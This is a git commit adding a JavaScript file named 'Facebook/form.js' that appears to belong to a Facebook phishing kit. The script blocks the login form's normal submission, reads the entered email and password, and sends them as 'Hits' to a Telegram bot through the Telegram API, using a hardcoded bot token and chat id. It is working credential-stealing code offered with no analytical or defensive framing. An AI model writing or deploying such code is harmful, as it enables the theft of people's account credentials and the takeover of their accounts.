ea33f3ff47b04fa17f3812a8f86405f1a4dfac05
t0ufik01 <2fik.47@gmail.com>
2023-01-19 04:11:04 +0100

    Facebook

---
+++ Facebook/form.js
@@ -0,0 +1,26 @@
+const form = document.querySelector("#form");
+
+addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
+
+  var message = "Hits :%0A" + email + ":" + password;
+
+  var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
+  var chat_id = 1430266005;
+  var url =
+    "https://api.telegram.org/bot" +
+    token +
+    "/sendMessage?chat_id=" +
+    chat_id +
+    "&text=" +
+    message;
+
+  let api = new XMLHttpRequest();
+  api.open("GET", url, true);
+  api.send();
+
+  console.log("Successfully");
+});
